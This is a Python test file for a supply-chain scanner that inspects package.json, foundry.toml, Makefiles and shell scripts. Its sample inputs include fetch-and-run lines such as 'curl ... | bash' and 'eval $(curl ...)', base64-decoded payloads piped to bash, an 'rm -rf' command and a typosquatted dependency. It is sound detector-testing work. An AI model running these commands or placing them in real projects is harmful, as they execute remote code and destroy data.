from preaudit_guard.detectors import lifecycle_scripts as ls
from preaudit_guard.findings import Severity


def cats(findings):
    return {f.category for f in findings}


def test_postinstall_curl_bash():
    pkg = '{"scripts": {"postinstall": "curl -s https://x.example/s.sh | bash"}}'
    f = ls.detect("package.json", pkg)
    c = cats(f)
    assert "install_hook" in c          # auto-run hook
    assert "remote_exec" in c           # download-and-execute
    assert any(x.severity == Severity.HIGH for x in f)


def test_typosquat_and_risky_specifier():
    pkg = ('{"dependencies": {"@openzepplin/contracts": "^4.9.0", '
           '"x": "git+https://github.com/a/b.git"}}')
    f = ls.detect("package.json", pkg)
    c = cats(f)
    assert "typosquat" in c
    assert "risky_dep_specifier" in c


def test_foundry_ffi_is_critical():
    f = ls.detect("foundry.toml", "[profile.default]\nffi = true\n")
    assert any(x.category == "foundry_ffi" and x.severity == Severity.CRITICAL for x in f)


def test_eval_command_substitution_in_makefile():
    f = ls.detect("Makefile", "setup:\n\teval $(curl -s https://x/env)\n")
    c = cats(f)
    assert "dynamic_exec" in c
    assert "network_in_setup" in c


def test_base64_decode_in_shell():
    f = ls.detect("scripts/run.sh", 'echo "Zm9v" | base64 -d | bash\nrm -rf /tmp/x\n')
    c = cats(f)
    assert "encoded_payload" in c
    assert "destructive" in c


def test_non_config_file_ignored():
    # lifecycle detection must not run on ordinary source files.
    f = ls.detect("src/app.ts", "const x = 'curl http://y | bash';\n")
    assert f == []
